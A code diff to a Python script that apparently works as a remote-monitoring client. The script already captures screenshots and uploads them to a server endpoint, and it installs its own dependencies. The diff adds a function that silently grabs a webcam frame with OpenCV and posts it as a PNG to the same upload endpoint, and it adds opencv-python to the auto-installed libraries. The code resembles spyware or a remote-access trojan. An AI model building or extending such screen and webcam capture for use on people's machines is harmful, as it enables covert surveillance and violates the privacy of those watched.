@@ -3,8 +3,31 @@ import time
 import subprocess
 import io
 import pyautogui
+import PIL
+import cv2
 
 endPoint = "http://localhost:8080"
+
+def GetCameraBytes():
+    cap = cv2.VideoCapture(0)
+    ret, frame = cap.read()
+    cap.release()
+
+    if not ret:
+        print("Failed to capture webcam frame")
+        return None
+    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+    imgBytes = io.BytesIO()
+    img = PIL.Image.fromarray(frame_rgb)
+    img.save(imgBytes, format="PNG")
+    imgBytes.seek(0)
+    return imgBytes
+
+def GetCamera():
+    imgBytes = GetCameraBytes()
+    if imgBytes:
+        fileData = {"file": ("cameraframe.png", imgBytes, "image/png")}
+        requests.post(endPoint + "/upload", files=fileData)
 
 def GetScreenBytes():
     screenShot = pyautogui.screenshot()
@@ -19,7 +42,7 @@ def GetScreen():
     requests.post(endPoint + "/upload", files=fileData)
 
 
-requiredLibraries = ["numpy", "pyautogui"]
+requiredLibraries = ["numpy", "pyautogui", "opencv-python"]
 
 def InstallLibraries():
     for library in requiredLibraries:
